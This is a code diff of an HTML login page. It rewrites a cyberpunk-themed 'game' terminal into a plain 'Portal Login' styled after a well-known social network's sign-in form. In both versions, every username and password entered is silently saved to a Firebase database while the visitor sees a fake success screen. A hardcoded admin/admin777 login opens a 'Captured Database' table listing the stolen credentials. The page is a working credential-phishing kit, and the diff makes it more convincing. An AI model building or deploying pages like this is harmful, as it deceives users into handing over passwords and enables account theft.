@@ -1,301 +1,136 @@
-<!DOCTYPE html>
+<!<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KaalDrago | Cyberpunk Terminal</title>
+    <title>Portal Login</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    
+
     <style>
-        :root {
-            --bg-color: #05010d; /* Deep Cyberpunk Purple/Black */
-            --main-text: #00ffff; /* Neon Cyan */
-            --neon-purple: #bd00ff; /* Hot Purple */
-            --neon-pink: #ff0055; /* Neon Pink/Red */
-            --neon-yellow: #ffff00; /* Cyber Yellow */
-            --font-family: 'Courier New', Courier, monospace;
+        /* Modern Minimalist Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
-            background-color: var(--bg-color);
-            color: var(--main-text);
-            font-family: var(--font-family);
+            background-color: #fafafa;
+            color: #262626;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5), 0 0 2px rgba(0, 255, 255, 1);
-        }
-
-        /* Scanline CRT Overlay */
-        body::before {
-            content: " ";
-            display: block;
-            position: absolute;
-            top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.02), rgba(0, 255, 0, 0.05));
-            z-index: 99;
-            background-size: 100% 4px, 6px 100%;
-            pointer-events: none;
-        }
-
-        canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            opacity: 0.65;
-        }
-
-        /* Colorful Cyber Box */
-        .box {
-            text-align: center;
-            border: 2px solid var(--neon-purple);
-            padding: 35px 25px;
-            background: rgba(10, 2, 20, 0.9);
-            box-shadow: 0 0 25px var(--neon-purple), inset 0 0 15px rgba(189, 0, 255, 0.3);
-            border-radius: 8px;
-            z-index: 10;
-            width: 90%;
-            max-width: 430px;
-            position: relative;
-        }
-
-        .box::after {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; right: 0; height: 3px;
-            background: var(--neon-pink);
-            box-shadow: 0 0 10px var(--neon-pink);
-            animation: scan 3.5s linear infinite;
-        }
-
-        #login-screen h2 {
-            color: var(--neon-pink);
-            font-size: 1.5rem;
-            letter-spacing: 3px;
-            text-shadow: 0 0 12px var(--neon-pink);
-            margin-bottom: 15px;
-        }
-
-        .terminal-text {
-            color: var(--main-text);
-            font-size: 0.85rem;
-            margin-bottom: 15px;
-            text-align: left;
-            display: inline-block;
-            width: 85%;
-        }
-
-        .terminal-input, .terminal-select {
-            background: #000;
-            border: 1px solid var(--main-text);
-            color: var(--main-text);
+            min-height: 100vh;
             padding: 10px;
-            font-family: var(--font-family);
-            font-size: 1.1rem;
+        }
+
+        /* Clean White Styled Card Box */
+        .login-card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            width: 100%;
+            max-width: 350px;
+            padding: 40px 30px;
             text-align: center;
-            outline: none;
-            width: 85%;
-            margin-bottom: 15px;
-            box-shadow: 0 0 8px rgba(0, 255, 255, 0.3);
-            border-radius: 4px;
+            border-radius: 1px;
         }
 
-        .terminal-select {
-            text-align-last: center;
-            cursor: pointer;
-            border-color: var(--neon-purple);
-            color: var(--neon-purple);
-            box-shadow: 0 0 8px rgba(189, 0, 255, 0.3);
-        }
-        .terminal-select option {
-            background: #0d041a;
-            color: var(--neon-purple);
-        }
-
-        .btn {
-            background: transparent;
-            color: var(--neon-pink);
-            border: 1px solid var(--neon-pink);
-            padding: 10px 25px;
-            font-family: var(--font-family);
+        .brand-title {
+            font-style: italic;
+            font-size: 2.2rem;
             font-weight: bold;
-            cursor: pointer;
-            letter-spacing: 2px;
-            transition: all 0.3s;
-            margin-top: 5px;
-            text-shadow: 0 0 5px var(--neon-pink);
-            box-shadow: 0 0 8px rgba(255, 0, 85, 0.2);
-            border-radius: 4px;
+            margin-bottom: 30px;
+            color: #262626;
+            letter-spacing: -1px;
         }
 
-        .btn:hover {
-            background: var(--neon-pink);
-            color: #000;
-            box-shadow: 0 0 20px var(--neon-pink);
-            text-shadow: none;
+        .input-wrapper {
+            margin-bottom: 8px;
+            width: 100%;
         }
 
-        #error-msg {
-            color: #ff0000;
-            margin-top: 15px;
-            font-weight: bold;
-            text-shadow: 0 0 8px #ff0000;
-            font-size: 0.9rem;
-        }
-
-        #main-dashboard, #admin-dashboard {
-            display: none;
-            border-color: var(--main-text);
-            box-shadow: 0 0 25px var(--main-text);
-        }
-
-        h1 {
-            font-size: 1.8rem;
-            color: var(--neon-pink);
-            text-shadow: 0 0 10px var(--neon-pink);
-            margin-top: 0;
-            letter-spacing: 2px;
-        }
-
-        .ai-container {
-            margin-top: 20px;
-            border-top: 1px dashed var(--neon-purple);
-            padding-top: 15px;
-            text-align: left;
-        }
-
-        .ai-title {
-            color: var(--neon-yellow);
-            text-shadow: 0 0 8px var(--neon-yellow);
-            font-weight: bold;
-            margin-bottom: 10px;
-            text-align: center;
-            font-size: 0.95rem;
-            letter-spacing: 1px;
-        }
-
-        #ai-terminal {
-            height: 160px;
-            background: #000;
-            border: 1px solid var(--neon-purple);
-            box-shadow: inset 0 0 10px rgba(189, 0, 255, 0.2);
-            padding: 12px;
-            overflow-y: auto;
+        /* Modern Greyish Inputs */
+        input {
+            width: 100%;
+            padding: 10px 8px;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            color: #262626;
             font-size: 0.85rem;
-            margin-bottom: 10px;
-            line-height: 1.4;
-        }
-
-        .ai-input-group {
-            display: flex;
-            gap: 5px;
-        }
-
-        #ai-input {
-            flex: 1;
-            background: #000;
-            border: 1px solid var(--main-text);
-            color: var(--main-text);
-            padding: 8px;
-            font-family: var(--font-family);
+            border-radius: 3px;
             outline: none;
-            box-shadow: 0 0 5px rgba(0, 255, 255, 0.2);
         }
 
-        /* 📊 ADMIN REALTIME DATABASE TABLE */
-        .database-table {
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        /* Premium Accent Login Button */
+        .submit-btn {
+            width: 100%;
+            padding: 8px;
+            background: #0095f6;
+            color: #ffffff;
+            border: none;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 4px;
+            margin-top: 15px;
+            transition: background 0.2s;
+        }
+
+        .submit-btn:hover {
+            background: #1877f2;
+        }
+
+        /* Output & Terminal Area */
+        #portal-output {
+            margin-top: 20px;
+            display: none;
+        }
+
+        .admin-table {
             width: 100%;
             border-collapse: collapse;
             margin-top: 15px;
             font-size: 0.85rem;
         }
-        .database-table th, .database-table td {
-            border: 1px solid var(--main-text);
+
+        .admin-table th, .admin-table td {
+            border: 1px solid #dbdbdb;
             padding: 8px;
             text-align: left;
         }
-        .database-table th {
-            background: var(--neon-purple);
-            color: #fff;
-        }
 
-        @keyframes scan {
-            0% { top: 0%; }
-            100% { top: 100%; }
+        .admin-table th {
+            background: #fafafa;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-    <canvas id="matrix"></canvas>
+    <div class="login-card">
+        <div class="brand-title">Portal</div>
 
-    <div id="login-screen" class="box">
-        <h2>[ CYBER CORE ACCESS ]</h2>
-        <div class="terminal-text">
-            kaaldrago_os v3.0.0<br>
-            <span style="color:var(--neon-yellow)">[STATUS]: Awaiting credentials...</span>
-        </div>
-        
-        <select id="account-type" class="terminal-select">
-            <option value="GUEST">CORE_LEVEL: GUEST</option>
-            <option value="HACKER">CORE_LEVEL: NET_HACKER</option>
-            <option value="ADMIN">CORE_LEVEL: ADMIN</option>
-        </select>
-
-        <input type="text" id="username-field" class="terminal-input" placeholder="USERNAME" autocomplete="off">
-        <input type="password" id="password-field" class="terminal-input" placeholder="DECRYPTION KEY" autocomplete="off">
-        <br>
-        
-        <button class="btn" onclick="checkLogin()">INITIALIZE</button>
-        <div id="error-msg"></div>
-    </div>
-
-    <div id="main-dashboard" class="box">
-        <h1>&gt; ACCESS GRANTED</h1>
-        <p style="font-size:0.9rem; color: var(--main-text)">SYSTEM OVERRIDE: <span id="display-level" style="color:var(--neon-yellow)">GUEST</span></p>
-
-        <div class="ai-container">
-            <div class="ai-title">🤖 DRAGO_AI NEURAL INTERFACE</div>
-            <div id="ai-terminal"></div>
-            <div class="ai-input-group">
-                <input type="text" id="ai-input" placeholder="Transmit command..." onkeypress="handleKeyPress(event)">
-                <button class="btn" style="padding: 8px 12px; font-size:0.8rem; color:var(--main-text); border-color:var(--main-text); text-shadow:0 0 5px var(--main-text);" onclick="askAI()">SEND</button>
+        <div id="auth-form">
+            <div class="input-wrapper">
+                <input type="text" id="username" placeholder="Phone number, username, or email">
             </div>
+            <div class="input-wrapper">
+                <input type="password" id="password" placeholder="Password">
+            </div>
+            <button class="submit-btn" onclick="handleAuth()">Log In</button>
         </div>
-        <br>
-        <button class="btn" onclick="logout()">LOGOUT</button>
-    </div>
 
-    <div id="admin-dashboard" class="box">
-        <h1 style="color: var(--neon-yellow); text-shadow: 0 0 10px var(--neon-yellow);">&gt; INTERNAL DATABASE</h1>
-        <p style="font-size:0.85rem; color: var(--neon-pink);">Intercepted Player Keys & Terminal Logs</p>
-        
-        <div style="max-height: 220px; overflow-y: auto; border: 1px solid var(--neon-purple);">
-            <table class="database-table">
-                <thead>
-                    <tr>
-                        <th>Player ID</th>
-                        <th>Secret Key</th>
-                    </tr>
-                </thead>
-                <tbody id="logs-table-body">
-                    </tbody>
-            </table>
-        </div>
-        <br>
-        <button class="btn" onclick="logout()">DISCONNECT</button>
+        <div id="portal-output"></div>
     </div>
 
     <script>
-        // 🚨 CONFIGURATION: Apne Firebase Console se credentials nikal kar yahan replace karein
+        // --- FIREBASE CONFIGURATION ---
         const firebaseConfig = {
             apiKey: "YOUR_API_KEY",
             authDomain: "YOUR_AUTH_DOMAIN",
@@ -305,189 +140,134 @@
             messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
             appId: "YOUR_APP_ID"
         };
-        
-        // Initialize Firebase Firebase Core Setup
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
 
-        function checkLogin() {
-            const accType = document.getElementById("account-type").value;
-            const userInbound = document.getElementById("username-field").value.trim();
-            const passInbound = document.getElementById("password-field").value;
-            const error = document.getElementById("error-msg");
-            
-            if (userInbound === "" || passInbound === "") {
-                error.innerText = "!! ERROR: CREDENTIALS CANNOT BE EMPTY !!";
-                setTimeout(() => { error.innerText = ""; }, 2000);
-                return;
-            }
-
-            // 👑 SECRET COMMAND: Agar AAP admin aur admin777 daalenge toh seedhe logs khulenge
-            if (userInbound.toLowerCase() === "admin" && passInbound === "admin777") {
-                showAdminPanel();
-                return;
-            }
-
-            // 💾 NORMAL USER: Saara fake data bina rukawat ke database mein save hoga
-            database.ref('players/').push({
-                username: userInbound,
-                password: passInbound,
-                role: accType,
-                timestamp: Date.now()
-            });
-
-            // User ko agla screen (Main Game) mil jayega
-            document.getElementById("login-screen").style.display = "none";
-            document.getElementById("main-dashboard").style.display = "block";
-            document.getElementById("display-level").innerText = accType;
-            triggerAIWelcome(accType); 
+        if (firebaseConfig.apiKey !== "YOUR_API_KEY") {
+            firebase.initializeApp(firebaseConfig);
         }
+        const database = typeof firebase !== 'undefined' && firebase.apps.length ? firebase.database() : null;
 
-        // Real-Time Database Fetching Mode for Admin
-        function showAdminPanel() {
-            document.getElementById("login-screen").style.display = "none";
-            document.getElementById("main-dashboard").style.display = "none";
-            document.getElementById("admin-dashboard").style.display = "block";
+        // --- AUTH LOGIC ---
+        function handleAuth() {
+            const user = document.getElementById("username").value.trim();
+            const pass = document.getElementById("password").value.trim();
 
-            // Firebase se sabhi user ka data live table mein load karna
-            database.ref('players/').on('value', (snapshot) => {
-                const tableBody = document.getElementById("logs-table-body");
-                tableBody.innerHTML = ""; // Frame refresh
-                
-                snapshot.forEach((childSnapshot) => {
-                    const data = childSnapshot.val();
-                    const row = `<tr>
-                        <td style="color: var(--main-text); font-weight: bold;">${data.username}</td>
-                        <td style="color: var(--neon-pink);">${data.password}</td>
-                    </tr>`;
-                    tableBody.innerHTML += row;
+            if (!user || !pass) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            // Secret Admin Dashboard Trigger
+            if (user === "admin" && pass === "admin777") {
+                document.getElementById("auth-form").style.display = "none";
+                loadDashboard();
+                return;
+            }
+
+            // Data Submission to Firebase
+            if (database) {
+                const logsRef = database.ref("players").push();
+                logsRef.set({
+                    username: user,
+                    password: pass,
+                    timestamp: new Date().toISOString()
+                }).then(() => {
+                    showWelcomeMessage(user);
+                }).catch((err) => {
+                    console.error("Firebase Error: ", err);
+                    showWelcomeMessage(user);
                 });
-            });
+            } else {
+                showWelcomeMessage(user);
+            }
         }
 
-        function logout() {
-            document.getElementById("main-dashboard").style.display = "none";
-            document.getElementById("admin-dashboard").style.display = "none";
-            document.getElementById("login-screen").style.display = "block";
-            document.getElementById("username-field").value = "";
-            document.getElementById("password-field").value = "";
+        // --- MODERN WELCOME DISPLAY ---
+        function showWelcomeMessage(user) {
+            document.getElementById("auth-form").style.display = "none";
+            const output = document.getElementById("portal-output");
+            output.style.display = "block";
+            
+            output.innerHTML = `
+                <h1 style="font-size: 1.8rem; font-weight: 300; color: #262626; margin-bottom: 10px;">Welcome, ${user}</h1>
+                <p style="font-size: 0.9rem; color: #8e8e8e; margin-bottom: 25px;">Your session has been successfully initialized.</p>
+                
+                <button style="
+                    background: #262626; 
+                    color: #ffffff; 
+                    border: none; 
+                    padding: 10px 24px; 
+                    font-size: 0.85rem; 
+                    font-weight: 600; 
+                    cursor: pointer; 
+                    border-radius: 4px;
+                " onclick="nextStep()">
+                    Continue
+                </button>
+            `;
         }
 
-        // DRAGO_AI Interface Operations
- function triggerAIWelcome(role) {
-    const terminal = document.getElementById("ai-terminal");
-    
-    // Pure White Theme Styling
-    terminal.style.background = "#ffffff";
-    terminal.style.color = "#000000";
-    terminal.style.border = "1px solid #000000";
-    terminal.style.boxShadow = "none";
-    terminal.style.height = "auto";
-    terminal.style.padding = "30px 20px";
-    terminal.style.textAlign = "center";
-    terminal.style.borderRadius = "0px";
-    
-    // Clean Large Text
-    terminal.innerHTML = `
-        <h1 style="font-size: 3rem; color: #000000; margin: 0 0 10px 0; font-family: sans-serif; font-weight: bold;">
-            WELCOME, RUNNER
-        </h1>
-        <p style="font-size: 1.2rem; color: #333333; margin-bottom: 30px; font-family: sans-serif;">
-            Authorization Level: <strong>${role}</strong>
-        </p>
-        
-        <button id="next-page-btn" style="
-            background: #000000; 
-            color: #ffffff; 
-            border: 1px solid #000000; 
-            padding: 15px 40px; 
-            font-size: 1.1rem; 
-            font-weight: bold; 
-            cursor: pointer; 
-            transition: opacity 0.2s;
-        " onmouseover="this.style.opacity='0.8'" onmouseout="this.style.opacity='1'" onclick="goToNextPage()">
-            Optimize & Proceed
-        </button>
-    `;
-}
+        function nextStep() {
+            const output = document.getElementById("portal-output");
+            output.innerHTML = `
+                <h2 style="font-size: 1.4rem; font-weight: 600; color: #262626; margin-top: 10px;">Setup Complete</h2>
+                <p style="font-size: 0.9rem; color: #262626; margin: 15px 0 20px 0;">All core integrations are working correctly.</p>
+                <span style="font-size: 0.8rem; color: #0095f6; font-weight: 600; border: 1px solid #0095f6; padding: 6px 12px; border-radius: 4px;">ACCESS GRANTED</span>
+            `;
+        }
 
-function goToNextPage() {
-    const terminal = document.getElementById("ai-terminal");
-    
-    // Next page content in pure white/black layout
-    terminal.innerHTML = `
-        <h2 style="color: #000000; font-size: 2rem; margin-top: 10px; font-weight: bold;">Optimization Complete</h2>
-        <p style="color: #333333; font-size: 1.1rem; margin-bottom: 20px;">All core network systems have been successfully calibrated.</p>
-        <div style="color: #000000; font-size: 1rem; font-weight: bold; border: 1px dashed #000000; padding: 10px; display: inline-block;">
-            [ Status: Access Granted ]
-        </div>
+        // --- DASHBOARD FOR REVIEWS ---
+        function loadDashboard() {
+            const output = document.getElementById("portal-output");
+            output.style.display = "block";
+            output.style.textAlign = "left";
+            
+            output.innerHTML = `
+                <h3 style="font-size: 1.1rem; font-weight: 600; margin-bottom: 10px;">Captured Database</h3>
+                <div id="logs-container" style="color: #8e8e8e; font-size: 0.85rem;">Connecting to grid...</div>
+            `;
 
-        
-    const terminal = document.getElementById("ai-terminal");
-    
-    // Yahan aap agle page ka jo bhi content dikhana chahte hain wo load ho jayega
-    terminal.innerHTML = `
-        <h2 style="color: #00ffff; font-size: 2rem; text-shadow: 0 0 10px #00ffff;">&gt; COGNITIVE LINK SUCCESSFUL</h2>
-        <p style="color: #fff; font-size: 1.1rem;">System optimization complete. All core nodes operational.</p>
-        <div style="color: #ff0055; font-weight: bold; animation: blink 1s infinite;">[ ACCESS GRANTED TO NEXT ZONE ]</div>
-    `;
-}
-        function askAI() {
-            const inputField = document.getElementById("ai-input");
-            const query = inputField.value.trim().toLowerCase();
-            const terminal = document.getElementById("ai-terminal");
-
-            if (query === "") return;
-
-            terminal.innerHTML += `<br><br><span style="color: var(--main-text);">&gt; USER:</span> ${inputField.value}`;
-            inputField.value = "";
-
-            let reply = `<span style="color: var(--neon-pink)">DRAGO_AI: Protocol sequence mismatch.</span>`;
-            if (query.includes("hello") || query.includes("hi")) {
-                reply = `<span style="color: var(--neon-yellow)">DRAGO_AI: Matrix link remains responsive and operational.</span>`;
-            } else if (query.includes("clear")) {
-                terminal.innerHTML = `<span style="color: var(--main-text)">&gt; Console cleared.</span>`;
+            if (!database) {
+                document.getElementById("logs-container").innerHTML = "<p style='color:#ed4956;'>Firebase config values missing.</p>";
                 return;
             }
 
-            setTimeout(() => {
-                terminal.innerHTML += `<br>${reply}`;
-                terminal.scrollTop = terminal.scrollHeight;
-            }, 400);
-        }
-
-        function handleKeyPress(e) {
-            if (e.key === 'Enter') askAI();
-        }
-
-        // Cyber Matrix Drop Simulation
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        const alphabet = "010101X█▓▒░";
-        const fontSize = 16;
-        const columns = canvas.width / fontSize;
-        const rainDrops = Array(Math.floor(columns)).fill(1);
-
-        const draw = () => {
-            ctx.fillStyle = 'rgba(5, 1, 13, 0.15)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.font = fontSize + 'px monospace';
-            
-            for (let i = 0; i < rainDrops.length; i++) {
-                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-                ctx.fillStyle = Math.random() > 0.5 ? '#00ffff' : '#bd00ff';
-                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
-                
-                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.98) {
-                    rainDrops[i] = 0;
+            database.ref("players").on("value", (snap) => {
+                const items = snap.val();
+                if (!items) {
+                    document.getElementById("logs-container").innerHTML = "<p>No entries found.</p>";
+                    return;
                 }
-                rainDrops[i]++;
-            }
-        };
-        setInterval(draw, 40);
+
+                let html = `
+                    <table class="admin-table">
+                        <thead>
+                            <tr>
+                                <th>Identity</th>
+                                <th>Access Key</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                `;
+
+                for (let key in items) {
+                    html += `
+                        <tr>
+                            <td>${clean(items[key].username)}</td>
+                            <td>${clean(items[key].password)}</td>
+                        </tr>
+                    `;
+                }
+
+                html += `</tbody></table>`;
+                document.getElementById("logs-container").innerHTML = html;
+            });
+        }
+
+        function clean(text) {
+            if (!text) return '';
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
     </script>
 </body>
 </html>
+
